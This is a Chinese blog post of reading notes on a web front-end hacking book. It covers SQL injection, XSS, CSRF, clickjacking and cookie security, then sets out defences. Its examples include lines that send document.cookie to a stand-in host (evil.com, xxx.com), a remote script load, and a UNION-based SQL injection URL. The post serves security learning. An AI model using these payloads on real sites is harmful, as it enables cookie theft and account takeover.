<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="/css/blog.css">
    <link rel="stylesheet" href="/css/fonts/iconfont.css">
    <!--<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">-->
    <link rel="stylesheet" href="//cdn.bootcss.com/fancybox/3.1.25/jquery.fancybox.min.css">
    <script src="/js/require.js" data-main="/js/main"></script>
</head>
<body>
<div id="blog" class="page page-theme-base" v-cloak>
    <blog-header></blog-header>
    <header class="page_hd" data-v-04342fbc="">
    <div class="container header" data-v-04342fbc="">
        <h1 class="logo" data-v-04342fbc="">
            <a href="/" class="nuxt-link-exact-active nuxt-link-active" data-v-04342fbc="">橙红年代</a>
        </h1>
        <div class="show-md" data-v-04342fbc="">
            <div class="btn-list" data-v-04342fbc="">
                <div class="btn-icon" data-v-04342fbc="">
                    <span class="btn-line" data-v-04342fbc=""></span>
                    <span class="btn-line" data-v-04342fbc=""></span>
                    <span class="btn-line" data-v-04342fbc=""></span>
                </div>
            </div>
        </div>
        <nav class="nav-responsive" data-v-04342fbc="">
            
            <a class="nav_item" href="/">首页</a>
            
            <a class="nav_item" href="/archives">归档</a>
            
            <a class="nav_item" href="/tags">标签</a>
            
        </nav>
    </div>
</header>
    <main class="page_mn" >
        <div class="container">
            <article class="article article-detail">
    <header class="text-center">
        <h2 class="article_hd">《web前端黑客技术揭秘》读书笔记</h2>
        <div class="article_info">
            <span class="hide-sm">发表于</span>
            <span class="show-sm">
                <i class="iconfont icon-archives"></i>
            </span>
            <time>2018/3/26 21:17:21</time>
            |
            <span class="hide-sm">分类于</span>
            <span class="show-sm"><i class="iconfont icon-tag"></i></span>
            
                <a href="/categories/JavaScript" class="hover-highlight">JavaScript</a>
            

        </div>
    </header>
    <div class="article_ct">
        <p>在项目中，往往更侧重的是前端业务逻辑，而对于web安全这块并没有过于关注。只是大概知道<code>xss</code>和<code>csrf</code>等术语，而具体的防范操作也只限于输入校验和表单提交增加<code>_token</code>字段。</p>
<p>最近在复习web安全这一块的内容，突然想起之前还没有看完的《web前端黑客技术揭秘》，因此重新翻阅，并整理相关笔记。</p>
<a id="more"></a>
<h2 id="web安全的关键点"><a href="#web安全的关键点" class="headerlink" title="web安全的关键点"></a>web安全的关键点</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>常规的查询如</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> uid = <span class="number">1</span></div></pre></td></tr></table></figure>
<p>其中uid参数来自于用户提交，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.foo.com/user?uid=1</div></pre></td></tr></table></figure>
<p>如果不做任何检测，则恶意用户可能构造另外的参数拼接sql查询语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.foo.com/user?uid=1 union select password, 1, 1, from users</div></pre></td></tr></table></figure>
<p>则后台拼接的sql语句为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">password</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="keyword">from</span> <span class="keyword">users</span></div></pre></td></tr></table></figure>
<p>此时用户的密码就可能泄露。</p>
<h3 id="XSS跨站攻击"><a href="#XSS跨站攻击" class="headerlink" title="XSS跨站攻击"></a>XSS跨站攻击</h3><p>假如业务代码里面存在下面逻辑</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>));</div></pre></td></tr></table></figure>
<p>如果在站点的某个地方出现了一个非法用户构造的链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/stea l.php?c=&quot;+escape(document.cookie)</div></pre></td></tr></table></figure>
<p>则上面的业务代码就会背离预期执行目的，获取当前用户的cookie值，然后通过img的src请求发送到恶意站点上</p>
<h3 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h3><p>比如发现站点上某个功能存在sql注入的风险，但是该接口在后台进行了权限验证（只有指定用户如管理员才可以访问），这样就无法直接进行sql注入了。但是使用<code>csrf</code>就很可能成功</p>
<ul>
<li>提交包含这条恶意sql注入语句的后台功能链接（事先编码，隐蔽恶意目的）给管理员，比如发邮件、留言、评论等</li>
<li>如果管理员登录了web应用，同时打开了这条链接</li>
<li>由于浏览器在访问这条链接时会自动带上包含管理员的身份的cookie，这样就骗过了权限验证，执行sql注入</li>
</ul>
<p>我们可以注意到csrf和xss的区别：</p>
<ul>
<li>csrf会<strong>借用</strong>目标用户的权限做一些借刀杀人的事情</li>
<li>xss常用来<strong>盗取</strong>目标信息</li>
</ul>
<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>同源策略是众多安全策略的一个，是web层面上的策略。同源策略规定：<strong>不同域的客户端脚本在没有明确授权的情况下，不能读取对方的资源</strong></p>
<p>上面的定义包含几个重要概念：</p>
<ul>
<li>同域要求两个站点同协议、同域名、同端口</li>
<li>客户端脚本目前主要指JavaScript（之前还有ActionScript）</li>
<li>授权指默认情况下，如果没有授权，则不允许跨域访问</li>
<li>web上的资源有的只有读权限（如referrer），有的有读写权限（如document.cookie）</li>
<li>资源这个概念比较广泛，只要是数据，都可以认为是资源</li>
</ul>
<p>在同一个域内，客户端脚本可以任意读写同源内的资源。</p>
<h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><blockquote>
<p> 通俗地说，社会工程学就是“骗”，即如何伪装攻击以欺骗目标用户</p>
</blockquote>
<h2 id="web安全中的前端"><a href="#web安全中的前端" class="headerlink" title="web安全中的前端"></a>web安全中的前端</h2><p>掌握前端基础是学习web安全中必不可少的环节。包括W3C标准、HTTP协议。</p>
<h3 id="基本点"><a href="#基本点" class="headerlink" title="基本点"></a>基本点</h3><p><strong>URL</strong></p>
<p>各种安全威胁都是班翠这URL的请求而进行的，如果客户端到服务端各层的解析没做好，就额能出现安全问题，需要注意URL的编码和解码形式</p>
<ul>
<li>escape，返回字符的Unicode编码值；解码函数unescape</li>
<li>encodeURI，对整个URL进行编码，其他一些在网址中有特殊含义的符号”; / ? : @ &amp; = + $ , #”，不进行编码；解码函数decodeURI</li>
<li>encodeURIComponent，跟encodeURI类似，还会对上面的特殊符号进行编码；解码函数decodeURIComponent</li>
</ul>
<p>关于URL编码，这里查到了一篇文章写得很详细：<a href="http://www.ruanyifeng.com/blog/2010/02/url_encoding.html" target="_blank" rel="external">关于URL编码 - 阮一峰的网络日志</a></p>
<p><strong>HTTP</strong></p>
<p>除了基本的HTTP协议，web安全中还需要额外关注S<code>et-Cookie</code>的两个字段</p>
<ul>
<li><code>httpOnly</code>标志，表示Cookie存在HTTP层面，不能被客户端脚本读取</li>
<li><code>Secure</code>表示，表示Cookie仅通过HTTPS协议进行安全传输</li>
</ul>
<p><strong>DOM</strong></p>
<p>我们的隐私数据都可能存储在以下位置：</p>
<ul>
<li>HTML内容中</li>
<li>浏览器本地存储中，如cookies、localStorage等</li>
<li>URL地址中</li>
</ul>
<p>这些都可以通过查找DOM获取到。</p>
<p><strong>iframe</strong></p>
<p>很多网站都通过iframe嵌入第三方内容，比如嵌入广告页面。</p>
<p>当攻击者入侵一个网站后，可以通过iframe嵌入自己的网马页面，用户访问该网站后，被嵌入的网马页面就会执行。</p>
<p>iframe之间的操作也存在同源策略限制。</p>
<p><strong>HTML内嵌脚本</strong></p>
<p>JavaScript除了出现在js文件中，也可以出现在HTML中的很多地方，比如<code>script</code>标签，HTML标签的on事件，以及一些标签的<code>href</code>和<code>src</code>等属性的伪协议(<code>javascript:;</code>)上。</p>
<p>这样导致防御XSS变得比较棘手，执行的位置越多，则表示越有可能出现XSS漏洞。根据不同的执行位置，对应的防御方案都不太一样。</p>
<h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p>在浏览器中，用户发出的请求基本上就是<code>get</code>和<code>post</code>，而攻击也基本依赖于发起各种请求来实现自己的目的。</p>
<p><strong>模拟get请求</strong></p>
<p>对于get请求，实际上就是一个URL，方式有很多种</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="string">'http://xxx.com?cookie'</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)</div><div class="line"><span class="keyword">new</span> Image().src = url</div><div class="line">location.href = url</div></pre></td></tr></table></figure>
<p>原理是相同的，通过JavaScript动态创建iframe、frame、script、link等标签对象，然后将他们的src或href属性指向目标地址即可</p>
<p><strong>模拟post请求</strong></p>
<p>可以通过form表单自提交的方式来模拟post请求。</p>
<p>其原理是通过JavaScript动态创建一个form，设置好form中每个input的键值，然后对form对象做submit操作即可。</p>
<p>此外ajax也是常用的模拟请求手段。</p>
<p><strong>ajax</strong></p>
<p>通过创建xhr然后发送网络请求，不仅是业务中常用的，也可以通过设置跨域，窃取用户的隐私数据。</p>
<blockquote>
<p>安全起见，有些请求头的值只能由user agent设置</p>
</blockquote>
<p>需要注意xhr对象可以设置的请求头，只是HTTP协议请求头的一个子集。如果任何请求头都可以通过JavaScript进行设置，那么前端的逻辑世界就混乱了。详情可以参考<a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name" target="_blank" rel="external">MDN文档</a>。</p>
<p>除此之外，部分响应头也是不能获取到的（比如<code>Set-Cookie</code>中可能包含<code>httponly</code>）。</p>
<p>另外一个需要注意的问题是：即使目标域不设置<code>Access-Control-Allow-Origin</code>，跨域提交的数据也可以被服务器接收到，只是浏览器会提示权限错误的问题。因为跨域本身就只是浏览器的限制而已。</p>
<p><strong>Cookie</strong></p>
<p>Cookie经常被用来存储用户的会话机制，保存用户的认证信息，因此攻击者特别喜欢盗取Cookie，这相当于盗取了在目标网站上的用户权限。</p>
<ul>
<li>子域cookie机制，设置cookie时如果不指定domain字段，则默认就是本域。可以通过修改domain实现不同子域共享cookie，随之而来的问题就是攻击者控制的其他子域也能读到这个cookie</li>
<li>路径cookie机制，设置cookie时如果不指定path字段，则默认就是目标页面路径，但是可以通过iframe实现跨页面读取cookie，因此设置path不能防止重要的cookie被盗取</li>
<li>HttpOnly机制，当设置了HttpOnly标志后，客户端脚本就无法读写该Cookie了，这样能有效地防御XSS攻击获取cookie。</li>
<li>SecureCookie机制，当设置了SecureCookie标志后，对应Cookie仅在HTTPS层面上安全传输，这样能降低重要Cookie被中间人截获的风险</li>
<li>Cookie有效期，如果没有设置过期时间，则Cookie会随着浏览器的关闭从内存中消失；反之，Cookie会等待过期时间到了才会消失</li>
<li>Cookie的P3P性质</li>
</ul>
<p><strong>函数劫持</strong></p>
<p>JavaScript的函数劫持很简单，只要在目标函数触发前，重写这个函数即可，类似于<code>Function.prototype.before</code>的实现</p>
<p>曾经的<code>codument.write</code>和<code>document.writeln</code>均被劫持攻击过。</p>
<p>函数劫持在一定程度上可以自动化分析DOM XSS，可以动态解密一些混淆的代码。</p>
<h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>CSS具有非常高的容错性。</p>
<p>在高级钓鱼攻击中，伪装出来的UI效果应该让人感觉就是真的。</p>
<p><strong>CSS History攻击</strong></p>
<p>利用<code>:visited</code>伪类技巧，准备一批常用的链接，然后设置他们<code>:visited</code>的样式（一般通过背景图的url发送一个get链接请求）。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-id">#link-1</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">'http://foo.com?data=1'</span>)&#125;</div></pre></td></tr></table></figure>
<p>如果某个链接在之前被访问过（存在于历史记录中），那么<code>:visited</code>就会触发，这样攻击者就可以知道用户是否访问过对应链接。</p>
<p><strong>属性选择符</strong></p>
<p>CSS3提供了部分属性选择器，这样就可以筛选出部分表单选项，然后触发对应的请求。</p>
<h2 id="前端黑客之XSS"><a href="#前端黑客之XSS" class="headerlink" title="前端黑客之XSS"></a>前端黑客之XSS</h2><blockquote>
<p>XSS即跨站脚本， 发生 在 <strong>目标 网 站 中 目标 用户</strong> 的<strong> 浏览器</strong> 层面 上， 当用户浏览器渲染整个 HTML文档的过程中出现了<strong>不被预期</strong> 的脚本指令并执行时， XSS就会发生。</p>
</blockquote>
<p>在第一章已经简单介绍了XSS的例子，即利用前端代码漏洞在目标用户的浏览器上执行恶意脚本。</p>
<p>之所以被称为<strong>跨站</strong>脚本攻击，是因为攻击代码可能很长，更常规的是目标用户浏览器上的恶意脚本是去加载一个远程的、包含完整逻辑的攻击脚本.</p>
<p>比如先预先准备一段小的恶意代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>. write(<span class="string">"&lt; script/ src=// www. evil. com/ alert. js&gt;&lt;/ script&gt;"</span>)</div></pre></td></tr></table></figure>
<p>当目标用户的浏览器在某种情况下执行了这行代码，就会加载完整的攻击脚本，从而发生攻击。</p>
<p>我们可以通俗的总结XSS为：想尽一切办法将你的脚本内容在目标网站中 目标用户的浏览器上解析执行即可。</p>
<h3 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h3><p><strong>反射型XSS</strong></p>
<p>发送请求时XSS代码出现在URL中，作为输入提交到服务端，服务端解析后响应，在响应内容中出现这段XSS代码，最后浏览器解析执行，这个过程像一次反射，故被称为反射型XSS。</p>
<p>比如后台代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> $_GET[<span class="string">'x];</span></div></pre></td></tr></table></figure>
<p>如果用户点击了下面链接（比如来自于恶意攻击者构造的链接）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://foo.com?x=&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>则当浏览器解析html时，就会执行对应的script脚本内的内容。</p>
<p><strong>存储型XSS</strong></p>
<p>存储型XSS与反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（通常是数据库），下次请求目标页面时不用再提交XSS代码。</p>
<p>比如一个留言板记录，而已用户提交了包含XSS代码的留言，后台将数据保存到数据库，当用户查看浏览板时，在渲染的页面上就包含了恶意的XSS脚本，浏览器解析执行时就触发了XSS攻击。</p>
<p><strong>DOM XSS</strong></p>
<p>这种类型的XSS代码并不需要服务器解析响应的直接参与，触发XSS依靠浏览器的DOM解析。</p>
<p>比如前面的那个例子，根据前端代码的漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(location.hash.substr(1))</div></pre></td></tr></table></figure>
<p>伪造包含攻击的链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://foo.com/index.html#alert(1)</div></pre></td></tr></table></figure>
<p>如果用户点击了上面的链接，就会直接触发。</p>
<h3 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h3><p>可以看见，XSS主要是浏览器执行了非预期的JavaScript代码而产生的。</p>
<p>在浏览器端，JS可以做很多东西，比如盗取用户cookie、Dos客户端浏览器、劫持用户行为、广告等。</p>
<h3 id="防御XSS"><a href="#防御XSS" class="headerlink" title="防御XSS"></a>防御XSS</h3><p>// todo</p>
<h2 id="前端黑客之CSRF"><a href="#前端黑客之CSRF" class="headerlink" title="前端黑客之CSRF"></a>前端黑客之CSRF</h2><blockquote>
<p>XSRF是跨站请求伪造，攻击的发生是由各种请求造成的，对于CSRF来说，它的请求有两个关键点，跨站点和请求伪造。</p>
</blockquote>
<ul>
<li>跨站点指的是目标网站的某个功能是由其他恶意站点发出的（实际上也可能来自于本站）</li>
<li>请求伪造的定义是：如果请求的发出不是用户的本意，那么这个请求就是伪造的。</li>
</ul>
<p>试想这样一个场景：目标站点A上存在一个删除文章的功能，这种功能一般需要用户点击“删除链接“时才会删除指定的文章。<code>http://a.com/article/del?id=1</code>。</p>
<p>这样删除文章实际上就是发送一个GET请求，如果使用XSS，我们可以使用Ajax，或者动态创建一个标签对象修改src属性来实现。</p>
<p>但是如果网站上不存在XSS漏洞，则我们如何在恶意站点B上面实现删除文章的功能呢？</p>
<p>在站点B上面编写一个可以发送删除文章功能的GET请求，然后只需要欺骗站点A的用户访问站点B对应的恶意页面即可触发对应攻击。</p>
<h3 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h3><p><strong>GET请求</strong></p>
<p>浏览器有一个非常重要的安全策略，即同源策略，用来限制客户端脚本的跨域请求行为。但是，由客户端发情的HTML标签发出的跨域GET请求被认为是合法的（尽管并没有能力获得目标页面响应的数据内容），如果将这样的GET请求限制住，那么Web的世界就过于封闭了。</p>
<p><strong>可以无JavaScript参与</strong></p>
<p>在上面的例子中，只需要B站点的恶意页面上能够发送恶意的请求，就会触发攻击，这个请求可以由JavaScript构造get请求发出（比如动态生成Image对象），也可以直接由一个img标签发出。</p>
<p><strong>请求是身份验证后的</strong></p>
<p>在上面的例子中发送的GET请求报文中，除了请求来源<code>Referer</code>的值不一样之外，其他头部基本一致，尤其是Cookie值。这是因为浏览器在请求对应域名时，会自动携带该域名相关的Cookie。（IE需要在响应投不中设置了P3P，才允许跨域请求资源时携带对应的Cookie值）。</p>
<p>这是CSRF跨域请求伪造中，实现<strong>伪造</strong>最重要的一个环节。</p>
<p><strong>POST请求</strong></p>
<p>除了基本的GET请求外，也可以通过form表单自提交来实现post请求，来达到请求伪造的目的。</p>
<h3 id="CSRF类型"><a href="#CSRF类型" class="headerlink" title="CSRF类型"></a>CSRF类型</h3><p><strong>HTML CSRF</strong></p>
<p>许多HTML元素都可以发起请求，比如<code>link</code>、<code>img</code>、<code>meta</code>、<code>iframe</code>、<code>script</code>、<code>a</code>等</p>
<p>此外CSS中的<code>@import</code>和<code>background:url()</code>也可以发起一个简单的get请求。</p>
<p>由于同源策略，POST请求只能通过form提交的方式来实现。</p>
<p><strong>JSON HiJacking</strong></p>
<p>如果后台以<strong>JSONP</strong>的形式返回数据，则在恶意页面上可以自定义一个回调函数，然后再发送对应的JSONP请求到服务器，由于请求会携带用户身份信息，这样恶意页面上的回调函数就可以获取到对应的隐私数据。</p>
<p><strong>flash csrf</strong></p>
<p>flash的世界也遵循同源策略，由于现在flash已经逐渐被废弃了，因此这里暂且略过。</p>
<h3 id="CSRF的危害"><a href="#CSRF的危害" class="headerlink" title="CSRF的危害"></a>CSRF的危害</h3><p>CSRF可以篡改目标网站上的用户数据、盗取用户的隐私数据等</p>
<h2 id="前端黑客之界面操作劫持"><a href="#前端黑客之界面操作劫持" class="headerlink" title="前端黑客之界面操作劫持"></a>前端黑客之界面操作劫持</h2><blockquote>
<p>界面操作劫持是一种基于视觉欺骗的Web会话劫持攻击，通过欺骗用户的操作行为，执行恶意代码，在用户不知情的情况下窃取敏感信息，篡改数据等。</p>
</blockquote>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p><strong>点击劫持</strong></p>
<p>通过劫持用户的鼠标点击操作，主要在有重要会发交互的页面上</p>
<p><strong>拖拽劫持</strong></p>
<p>现代web应用中，有一些需要用户采用鼠标拖放完成的操作，这大大扩展了点击劫持的攻击范围。此外，拖放操作不受同源策略的限制，用户可以把一个域的内容拖放到另一个不同的域。</p>
<p><strong>触屏劫持</strong></p>
<p>移动智能终端设备由于体积的限制，一般都没有鼠标、键盘，可以采用类似于点击劫持的攻击模式，实现对用户触摸屏操作的劫持攻击。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>前面提到的各种劫持操作的首要技术是在用户可见页面上覆盖一个不可见的框（可以理解为透明层 + iframe），然后通过定位等实现在用户点击页面上可见的UI，实际上触发的是透明层上的UI，从而实现操作劫持</p>
<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>界面操作劫持是一种社工色彩很强烈的跨域操作，他可以删除与篡改数据、偷取隐私甚至爆发蠕虫。</p>
<h2 id="漏洞检测和利用"><a href="#漏洞检测和利用" class="headerlink" title="漏洞检测和利用"></a>漏洞检测和利用</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>这类XSS最需要注意的就是URL。通过构造恶意的URL，然后根据请求后的反应来看是否有弹出窗或者引起浏览器脚本错误。</p>
<p>一般服务端的输出可能有下面几处</p>
<ul>
<li>HTML标签之间，这种情形只需要插入script脚本即可</li>
<li>HTML标签之内，如input标签的value值，此时可以通过<code>&quot;</code>引号提前关闭value属性，然后绑定onmouseover等事件，或者直接闭合标签，插入script脚本</li>
<li>JavaScript的变量值，如果该变量值被eval执行了，则也会造成XSS攻击</li>
<li>CSS样式表的值，如控制某个字体大小，如果出现在css expression中,则也会造成XSS攻击</li>
</ul>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>实际上存储型XSS和反射型XSS差别不大，我们需要研究的是服务端的输出到底在哪里</p>
<ul>
<li>表单提交后跳转到的页面可能是输出页面</li>
<li>表单所在的页面可能是输出地</li>
<li>去搜寻整个网站</li>
</ul>
<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>客户端逻辑实际上可以很复杂，尤其是很多人喜欢用各种JavaScript去动态生成一些DOM逻辑，这种复杂性可能导致DOM XSS能够意外地出现。</p>
<p>先了解DOM渲染的一些问题</p>
<ul>
<li>HTML与JavaScript的自解码机制，指的是出现在HTML中的JavaScript标签（比如onclick等事件绑定），可以进行HTML形式的编码，在JavaScript执行之前，HTML形式的编码会自动解码</li>
<li>具备HtmlRncode功能的标签，比如textarea、title、iframe、noscript等标签中的HTML是不会被解析的</li>
<li>URL编码差异，浏览器在处理用户发起请求时的urlencode策略存在差异，导致在某些场景中出现XSS漏洞</li>
<li>DOM修正式渲染，浏览器会在DOM渲染上进行各种修正，不同的浏览器进行的这种修正可能存在一些差异</li>
</ul>
<p>然后是关于如何发现DOM XSS，可以参考下面这个网站</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki</div></pre></td></tr></table></figure>
<p>要尽力避免代码中比较常规的一些安全漏洞，比如<code>eval</code>等。</p>
<h3 id="混淆的代码"><a href="#混淆的代码" class="headerlink" title="混淆的代码"></a>混淆的代码</h3><p>在浏览器中常用的进制混淆有八进制、十进制和十六进制</p>
<ul>
<li>HTML和CSS中只能使用十进制和十六进制</li>
<li>JavaScript中可以使用八进制、十进制和十六进制</li>
</ul>
<p>在前面已经提到了JavaScript中的三套编/解码函数，这里不再赘述</p>
<p><strong>HTML中代码注入技巧</strong></p>
<ul>
<li>标签，由于HTMLUAN的松散性和各个标签的不同优先级，使得我们可以创造出很多代码混淆或绕过方式</li>
<li>属性，与标签类似，HTML标签中的属性同样也是大小写不敏感的，并且属性值可以用双引号、单引号引起来，甚至可以无引号</li>
<li>伪协议，部分支持资源属性的标签，可以在其链接中使用伪协议（<code>javascript:;</code>、<code>vbscript:;</code>和<code>data:;</code>）</li>
</ul>
<p>比如在XSS攻击中，可以提前闭合标签或属性，来完成恶意代码的执行</p>
<p><strong>CSS中代码注入技巧</strong></p>
<ul>
<li>资源类属性可以通过伪协议来注入代码</li>
<li>expression，这是IE独有的CSS属性，可以插入并执行一段JS代码</li>
</ul>
<p><strong>JavaScript中代码注入技巧</strong></p>
<p>当XSS出现在JavaScript代码的变量中时，我们只要顺利闭合之前的变量就可以了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">// 原始代码</div><div class="line">var a = &quot;&lt;?php echo $userinput ?&gt;&quot;</div><div class="line"></div><div class="line">// 伪造输入</div><div class="line">$userinput = 1&quot;; aleret(1)&quot;</div><div class="line">// 则解析为</div><div class="line">var a = &quot;1&quot;; aleret(1)&quot;&quot;</div></pre></td></tr></table></figure>
<ul>
<li>使用JSONP，可以从自定义的callback函数名入手。</li>
<li>从编码入手，先进行进制转换，然后用eval来执行。</li>
</ul>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>进行渗透之前，我们需要明确渗透目标环境是什么，目标用户是谁，达到攻击的预期效果是什么等。</p>
<ul>
<li>通过referer可以获取链接上某些私密信息</li>
<li>浏览器记住的明文密码，通过DOM操作可以获取其中的密码，而且是明文</li>
<li>键盘记录器，通过监听键盘事件，收集用户的输入信息</li>
<li>检测数据接口，有的接口权限校验不完善，可以模拟数据接口提交</li>
<li>书里面还介绍了很多其他方法，一下子有点缓不过来哈哈，后面再慢慢填坑。</li>
</ul>
<h3 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h3><ul>
<li>通过HTML5的新标签，也可能穿过目标的过滤器名单，造成XSS攻击</li>
<li>通过History新防范，可以通过短地址完美隐藏URL恶意代码，也可以伪造历史记录信息</li>
<li>CORS可以向任意网站发送跨域请求</li>
<li>地里定位会造成用户的位置隐私暴露</li>
</ul>
<h3 id="Web蠕虫"><a href="#Web蠕虫" class="headerlink" title="Web蠕虫"></a>Web蠕虫</h3><p>web蠕虫的思想很简单，就是用户参与，然后用户被动或主动地传播了威胁。蠕虫的危害比较大</p>
<ul>
<li>可以批量对用户数据进行恶意操作，使目标网站面临巨大的信任危机</li>
<li>拒绝服务攻击，对目标网站服务进行大面积的拒绝服务攻击，导致yoghurt无法正常使用网站功能</li>
<li>分布式拒绝服务攻击，攻击目标是某个其他网站，如果所有被蠕虫感染的用户都想目标网站发起请求，则发起了DDos攻击。</li>
<li>散播广告、传播舆论</li>
<li>创博网页木马，网马内的二进制数据或脚本病毒植入操作系统本地执行</li>
</ul>
<h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><h3 id="浏览器厂商的防御"><a href="#浏览器厂商的防御" class="headerlink" title="浏览器厂商的防御"></a>浏览器厂商的防御</h3><p>现代的浏览器都开始意识到安全问题，因此愿意去遵守W3C标准，包括</p>
<ul>
<li>扩展的X头部<ul>
<li><code>X-Frame-Options</code></li>
<li><code>X-XSS-Protection</code></li>
<li><code>X-Content-Security-Policy</code></li>
</ul>
</li>
<li>CSP（<code>X-Content-Security-Policy</code>）策略，对JavaScript、HTML、CSS进行分离</li>
</ul>
<h3 id="web厂商的防御"><a href="#web厂商的防御" class="headerlink" title="web厂商的防御"></a>web厂商的防御</h3><p>站点服务商需要评估自己的业务场景，然后给出合理的安全架构方案。</p>
<ul>
<li>域分离，将一些业务关联性较小的内容转移到了不相干的域中</li>
<li>使用https进行安全传输，使用安全cookie，包括httpOnly和Secure</li>
<li>使用验证码，防止XSS/CSRF非法提交</li>
<li>谨慎使用第三方内容</li>
</ul>
<h3 id="XSS防御方案"><a href="#XSS防御方案" class="headerlink" title="XSS防御方案"></a>XSS防御方案</h3><p>假定一切输入都是有害的，那么在服务端的对策一般如下</p>
<ul>
<li>输入校验，包括长度限制、值类型是否正确，是否包含特殊字符</li>
<li>输出编码，根据输出位置进行相应的编码，遵守<strong>该数据不要超出自己所在的区域，也不要被当作指令执行</strong></li>
</ul>
<p>我们只要清楚的知道用户输入到最终的输出整个过程的每个环节，保证最终输出是安全的。</p>
<h3 id="CSRF防御方案"><a href="#CSRF防御方案" class="headerlink" title="CSRF防御方案"></a>CSRF防御方案</h3><ul>
<li>检查<code>referer</code>字段是否同域，但是对来自于站点内的csrf攻击无效</li>
<li>限制cookie的生命周期，在一定程度上缓解被csrf攻击的概率</li>
<li>使用验证码，有效阻断csrf，缺点是用户体验比较差</li>
<li>使用随机生成的一次性token<ul>
<li>首先在服务端生成一个唯一的token，然后会保留下来</li>
<li>将token传递到页面上，通常是某个表单的隐藏字段中，并随着表单的提交而提交</li>
<li>服务器会判断用户提交的表单是否有这个唯一的token</li>
</ul>
</li>
</ul>
<h3 id="界面操作劫持防御"><a href="#界面操作劫持防御" class="headerlink" title="界面操作劫持防御"></a>界面操作劫持防御</h3><p>使有重要会话的交互页面不允许被iframe嵌入，或者只允许被同于的iframe嵌入。</p>
<ul>
<li><code>X-Frame-Options</code>，浏览器会根据该字段判断网页是否可以被嵌入</li>
<li>Frame Busting 脚本防御，使用JavaScript对页面进行控制，达到页面无法被iframe嵌入的目的。</li>
